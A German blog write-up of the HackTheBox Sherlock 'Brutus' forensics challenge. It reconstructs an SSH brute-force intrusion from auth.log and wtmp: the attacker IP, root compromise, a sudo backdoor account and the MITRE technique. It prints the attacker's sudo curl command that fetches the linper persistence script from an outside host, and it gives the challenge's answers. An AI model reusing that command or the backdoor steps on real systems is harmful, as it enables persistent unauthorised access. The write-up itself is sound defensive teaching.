---
title: "Brutus – HackTheBox / Sherlocks DE"
date: 2026-05-09
categories: [HackTheBox, Sherlocks]
tags: [forensics, brute-force, auth-log, wtmp, ssh]
lang: de
alt_url: /posts/brutus-hackthebox-ENG/
---

![Brutus – HackTheBox / Sherlocks DE](/assets/img/posts/brutus/picture0.png)

{% include lang-switcher.html %}

CTF-Challenges (Capture the Flag) machen das Erlernen von Cybersicherheit viel einfacher, weil man in einer sicheren Umgebung üben kann, die sich wie die echte Welt anfühlt. Eine dieser Challenges heißt **Brutus** und ist auf HackTheBox zu finden. Sie gehört zur **Sherlock**-Kategorie und ist als *sehr einfach* eingestuft — damit ist sie ideal für Anfänger.

In dieser Challenge bekommt man zwei Dateien zum Arbeiten. Die erste ist *auth.log*, eine einfache Textdatei, die jeden Anmeldeversuch, jedes Sitzungsereignis und jeden sudo-Befehl auf dem System aufzeichnet — im Wesentlichen eine Zeitleiste von allem, was passiert ist. Die zweite ist *wtmp*, eine Binärdatei, die Benutzersitzungen aufzeichnet und nicht direkt wie eine Textdatei gelesen werden kann. Um sie lesbar zu machen, verwenden wir *utmpdump*, ein Standard-Linux-Tool aus dem `util-linux`-Paket, das den binären Inhalt in ein lesbares Format umwandelt. Zusammen liefern diese zwei Dateien alles, was wir brauchen, um die Aktionen des Angreifers von Anfang bis Ende nachzuvollziehen.

## Vorbereitung

1. `Brutus.zip` von HackTheBox herunterladen. Vor dem Entpacken den Inhalt prüfen:

   ```bash
   unzip -l Brutus.zip
   ```

   ![Inhalt von Brutus.zip](/assets/img/posts/brutus/picture1.png)
   _Picture 1: Inhalt von Brutus.zip — auth.log und wtmp aufgelistet_

2. Das Archiv mit *7-Zip* und dem auf der HackTheBox-Website angegebenen Passwort entpacken:

   ```bash
   7z x Brutus.zip
   ```

   ![Brutus.zip mit 7-Zip entpackt](/assets/img/posts/brutus/picture2.png)
   _Picture 2: Brutus.zip mit 7-Zip entpackt_

3. Vor der Analyse die Dateitypen prüfen. *auth.log* ist eine Textdatei (verwendbar mit `grep` und `awk`), während *wtmp* eine Binärdatei ist und `utmpdump` benötigt:

   ```bash
   file auth.log wtmp
   ```

   ![file-Befehl Ausgabe](/assets/img/posts/brutus/picture3.png)
   _Picture 3: auth.log als ASCII-Text erkannt, wtmp als Binärdaten — bestätigt, welches Tool für welche Datei verwendet wird_

## Analyse

### Aufgabe 1: Analyse von *auth.log* — Welche IP-Adresse hat der Angreifer für den Brute-Force-Angriff verwendet?

Eine sich wiederholende IP in fehlgeschlagenen Anmeldeversuchen allein ist ein schwacher Hinweis — ein normaler Benutzer könnte einfach sein Passwort falsch tippen. Der Hinweis gewinnt an Gewicht, wenn er mit zwei weiteren Faktoren kombiniert wird: dem Volumen (210 fehlgeschlagene Versuche von `65.2.161.68`) und dem Zeitrahmen (~19 Versuche pro Sekunde über 11 Sekunden). Zusammen — eine einzige Quell-IP, eine hohe Anzahl fehlgeschlagener Versuche (210) und eine schnelle Anfragerate (~19 pro Sekunde) — deuten diese Indikatoren auf automatisierte Werkzeuge hin, nicht auf normales Benutzerverhalten.

```bash
grep "Failed password" auth.log \
  | grep -oE 'from [0-9.]+' \
  | awk '{print $2}' \
  | sort \
  | uniq -c \
  | sort -rn
```

Das Ergebnis zeigt einen auffälligen Ausreißer — `65.2.161.68` ist für 210 fehlgeschlagene Anmeldeversuche innerhalb von 11 Sekunden verantwortlich. Bei ungefähr 19 Anfragen pro Sekunde ist diese Rate nicht mit manueller Eingabe vereinbar.

![Fehlgeschlagene Anmeldeversuche nach Quell-IP](/assets/img/posts/brutus/picture4.png)
_Picture 4: 65.2.161.68 verantwortlich für 210 fehlgeschlagene Anmeldeversuche — höchste Anzahl deutet auf Brute-Force-Ursprung hin_

> **Antwort:** `65.2.161.68`
{: .prompt-info }

### Aufgabe 2: Die Brute-Force-Versuche waren erfolgreich. Wie lautet der Benutzername des kompromittierten Kontos?

Um erfolgreiche Anmeldungen zu identifizieren, die Log-Datei nach akzeptierten Passwort-Ereignissen filtern:

```bash
grep "Accepted password" auth.log
```

Die Ausgabe zeigt vier akzeptierte Passwort-Ereignisse — drei für `root` und eines für `cyberjunkie` — alle von `65.2.161.68`. Die erste erfolgreiche root-Anmeldung erscheint um **06:31:40**, aber Zeile 294 in `auth.log` zeigt, dass sich diese Sitzung innerhalb derselben Sekunde wieder trennt. Das ist kein interaktiver Login, sondern ein Brute-Force-Tool, das die Anmeldedaten überprüft und sich sofort wieder trennt. Die eigentliche interaktive root-Sitzung beginnt später um **06:32:44**.

![Akzeptierte Passwort-Ereignisse](/assets/img/posts/brutus/picture5.png)
_Picture 5: Erste erfolgreiche root-Authentifizierung um 06:32:44; der Treffer um 06:31:40 ist die Validierung des Brute-Force-Tools, keine interaktive Sitzung_

> **Antwort:** `root`
{: .prompt-info }

### Aufgabe 3: UTC-Zeitstempel ermitteln, wann der Angreifer sich manuell am Server angemeldet und eine Terminalsitzung gestartet hat. Die Anmeldezeit ist in wtmp zu finden.

Diese Aufgabe fragt speziell nach dem *wtmp*-Wert, nicht nach dem *auth.log*-Wert. `auth.log` zeichnet den Moment auf, in dem `sshd` das Passwort akzeptiert hat. `wtmp` zeichnet auf, wann das Terminal tatsächlich dem Benutzer zugewiesen wurde. Diese zwei Ereignisse liegen eine Sekunde auseinander — `06:32:44` in auth.log gegenüber `06:32:45` in wtmp — genau deshalb prüfen Forensik-Analysten beide Quellen. `utmpdump` verwenden, um die binäre wtmp-Datei zu lesen:

```bash
utmpdump wtmp
```

![utmpdump-Ausgabe von wtmp](/assets/img/posts/brutus/picture6.png)
_Picture 6: wtmp mit utmpdump gelesen — root-Sitzung von 65.2.161.68 um 06:32:45 geöffnet_

> **Antwort:** `2024-03-06 06:32:45`
{: .prompt-info }

### Aufgabe 4: Welche Sitzungsnummer wurde der Angreifer-Sitzung für das root-Konto zugewiesen?

Sobald die interaktive Sitzung des Angreifers begann, hat das Betriebssystem ihr eine Sitzungsnummer zugewiesen. Die gesuchte Zeile wird von `systemd-logind` protokolliert:

```bash
systemd-logind[411]: New session 37 of user root
```

Das zeigt sowohl den Quellprozess als auch die Sitzungsnummer — nützlich zur Korrelation von Ereignissen in verschiedenen Log-Dateien.

![systemd-logind Sitzung 37](/assets/img/posts/brutus/picture7.png)
_Picture 7: root-Sitzung 37 um 06:32:44 nach erfolgreicher Passwortauthentifizierung von 65.2.161.68 geöffnet_

> **Antwort:** `37`
{: .prompt-info }

### Aufgabe 5: Der Angreifer hat als Teil seiner Persistenzstrategie einen neuen Benutzer hinzugefügt und diesem Konto höhere Rechte gegeben. Wie heißt dieses Konto?

Nach Benutzerverwaltungsereignissen in `auth.log` suchen:

```bash
grep -E "useradd|usermod|groupadd" auth.log
```

Um **06:34:18** wurden eine neue Gruppe und ein Benutzer namens `cyberjunkie` erstellt. Um **06:35:15** wurde dieser Benutzer zur `sudo`-Gruppe hinzugefügt und erhielt damit volle Administratorrechte.

![cyberjunkie Konto erstellt und sudo-Eskalation](/assets/img/posts/brutus/picture8.png)
_Picture 8: Backdoor-Konto cyberjunkie um 06:34:18 erstellt — um 06:35:15 zur sudo-Gruppe hinzugefügt_

> **Antwort:** `cyberjunkie`
{: .prompt-info }

### Aufgabe 6: Welche MITRE ATT&CK-Subtechnik-ID wird für die Persistenz verwendet?

Auf **attack.mitre.org → Enterprise Matrix → Persistence → Create Account → Local Account** navigieren, um die richtige Subtechnik-ID für das Erstellen eines lokalen Benutzers als Persistenzmechanismus zu finden.

![MITRE ATT&CK T1136.001](/assets/img/posts/brutus/picture9.png)
_Picture 9: MITRE ATT&CK T1136.001 — Technik zur Erstellung eines lokalen Kontos identifiziert_

> **Antwort:** `T1136.001`
{: .prompt-info }

### Aufgabe 7: Wann endete laut auth.log die erste SSH-Sitzung des Angreifers?

Die Sitzung begann um **06:32:45**. Um **06:37:24** endet die Verbindung — `auth.log` zeichnet die vollständige Sitzungsbeendigung um 06:37:24 auf, abgeschlossen mit `Removed session 37`.

![Sitzungsbeendigung um 06:37:24](/assets/img/posts/brutus/picture10.png)
_Picture 10: Trennung und Abmeldung der Angreifer-Sitzung von root um 06:37:24_

> **Antwort:** `2024-03-06 06:37:24`
{: .prompt-info }

### Aufgabe 8: Der Angreifer hat sich in sein Backdoor-Konto eingeloggt und erhöhte Rechte genutzt, um ein Skript herunterzuladen. Was ist der vollständige Befehl, der mit sudo ausgeführt wurde?

Um **06:37:34** wurde eine neue Sitzung für `cyberjunkie` erstellt. Nach sudo-Aktivitäten filtern:

```bash
grep "sudo:" auth.log | grep COMMAND
```

Die Ausgabe zeigt, dass um **06:39:38** ein externes Skript mit `curl` heruntergeladen wurde.

![sudo COMMAND Einträge für cyberjunkie](/assets/img/posts/brutus/picture11.png)
_Picture 11: Cyberjunkie führt privilegierte Befehle über sudo aus — liest /etc/shadow und lädt ein Skript herunter_

> **Antwort:**
>
> ```bash
> /usr/bin/curl \
>   https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
> ```
{: .prompt-info }

## Fazit

Das war meine erste HackTheBox-Sherlock-Challenge, und ich war überrascht, wie viel man aus einer einzigen einfachen Aufgabe lernen kann. Die Analyse der `auth.log`- und `wtmp`-Dateien hat gezeigt, wie man jeden Schritt eines Angreifers nachverfolgen kann — von Brute-Force-Versuchen bis hin zur Erstellung eines Backdoor-Kontos und dem Herunterladen von Skripten.

Die wichtigste Erkenntnis: Systemlogs liefern eine zuverlässige Aufzeichnung der Systemaktivität, mit der man das Verhalten von Angreifern rekonstruieren kann. Wenn jemand in ein System einbricht, hinterlässt er fast immer eine Spur — und unsere Aufgabe ist es, sie zu finden.

Wer gerade mit Cybersicherheit anfängt, findet in **Brutus** einen perfekten Einstiegspunkt — nicht zu schwer, aber es vermittelt das Gefühl, etwas Echtes zu tun.
